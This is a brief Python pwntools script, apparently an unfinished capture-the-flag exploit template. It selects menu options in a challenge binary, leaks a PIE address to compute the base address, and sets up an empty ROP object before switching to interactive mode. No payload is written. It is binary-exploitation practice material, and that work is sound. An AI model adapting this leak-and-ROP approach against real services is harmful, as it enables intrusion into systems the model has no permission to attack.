#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF("./chall")

# libc = ELF("./libc6-x32_2.36-9_amd64.so")

mov_rdi_rbp_nop_rbp = 0x00000000000011e7


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)
        # host = "2b3e03ad9fbfd024830fa18a-1024-intro-pwn-1.challenge.cscg.live"
        # port = 1337

        # r = remote(host, port, ssl=True)

    return r


def main():
    # good luck pwning :)
    r = conn()
    r.sendline("2")
    r.sendline("1")
    r.recvuntil(b"oke okeeeyy ini pie nya untukmuu, ")
    leak_pie = int(r.recvline().strip().decode(),16)
    exe.address = leak_pie - exe.sym['main']
    log.info(f"BASE {hex(exe.address)}")
    rop = ROP(context.binary)
    

    r.interactive()


if __name__ == "__main__":
    main()
